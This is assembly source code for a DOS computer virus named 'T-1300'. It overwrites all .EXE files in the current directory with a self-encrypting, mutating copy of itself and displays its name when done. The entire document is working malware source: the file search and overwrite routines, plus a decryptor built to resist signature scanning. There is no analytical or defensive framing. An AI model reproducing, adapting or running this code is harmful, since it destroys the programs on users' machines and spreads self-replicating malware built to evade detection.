;
; T-1300 Virus
;
; This is a non-resident overwriting self-encrypting semi-mutating .exe file
; infector. When an infected program is run, the virus will infect all the
; file in the current directory and displays "T-1300" when finished with
; infecting. This is a bit more advanced virus than "T-1000" and a wildcard
; scanstring is needed to find this virus.
;
S_1:            Lea Si,Main
                Mov Cx,MainLen
Length          Equ $-2
Decrypt:        Xor B [Si],0
CryptByte       Equ $-1
S_2             Equ $-2
S_3:            Inc Si
S_4:            Loop Decrypt
CryptLen        Equ $-S_1
Main:           Mov Ah,4eh
SeekNext:       Lea Dx,FileSpec
                Xor Cx,Cx
                Int 21h
                Jc Einde
                Mov Ax,3d02h
                Mov Dx,09eh
                Int 21h
                Xchg Ax,Bx
                Mov Ds,Cx
                Inc Cx
                Mov Ah,B Ds:[46ch]
                Mov Ds,Cs
                Mov B CryptByte,Ah
                Test Ah,1
                Jne NoReg
                Xor B S_1,Cl
                Xor B S_2,Cl
                Xor B S_3,Cl
NoReg:          Test Ah,2
                Jne NoXor
                Xor B Decrypt,2
NoXor:          Test Ah,4
                Jne NoLoop
                Xor B S_4,2
NoLoop:         Lea Si,Main
                Lea Di,CryptPart
                Mov Cx,MainLen
                Push Cx
CodeIt:         Lodsb
                Xor Al,Ah
                Stosb
                Loop CodeIt
                Pop Cx
                And Ax,03fffh
                Add Cx,Ax
                Mov W Length,Cx
                Mov Ah,40h
                Lea Dx,S_1
                Mov Cx,CryptLen
                Int 21h
                Mov Ah,40h
                Lea Dx,CryptPart
                Mov Cx,MainLen
                Int 21h
                Mov Ah,3eh
                Int 21h
                Mov Ah,4fh
                Jmp SeekNext
Einde:          Mov Ah,9
                Lea Dx,Msg
                Int 21h
                Ret

FileSpec        Db '*.EXE',0

Msg             Db 'T-1300$'

MainLen         Equ $-Main

CryptPart       Equ $
